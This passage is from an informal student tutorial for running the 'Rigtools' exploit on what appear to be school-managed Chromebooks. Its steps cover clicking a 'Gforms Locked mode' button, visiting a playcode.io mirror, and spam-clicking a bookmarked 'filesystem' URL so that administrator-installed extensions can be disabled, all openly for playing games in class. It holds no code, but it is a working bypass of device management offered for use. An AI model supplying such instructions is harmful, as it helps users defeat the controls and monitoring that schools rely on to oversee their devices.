4.Wait for a bit...It should open a page that has a lot of red and purple buttons.

5. Click on the button named "Gforms Locked mode".

6.Behold:RIGTOOLS!!! You can disable extensions that you want. (A reminder,These may stop working after a few weeks,you might have to do it again.)

```
There is a **real** second version,though.
When you get to the original version,
-Scroll down a bit,until you find a button named "Update Rigtools".Click it.
-After,go to 
```
rigtools.playcode.io
```
and that should work too.
If it does not work,drag the "filesystem" url into your bookmarks bar and spam click it.
For now,this will do...

And now you can do whatever you want on your computer.Use this wisely,and stay on task in class...At lunch,you could be hangin' out in the library with your friends playing bloxd.io or whatever... =-D
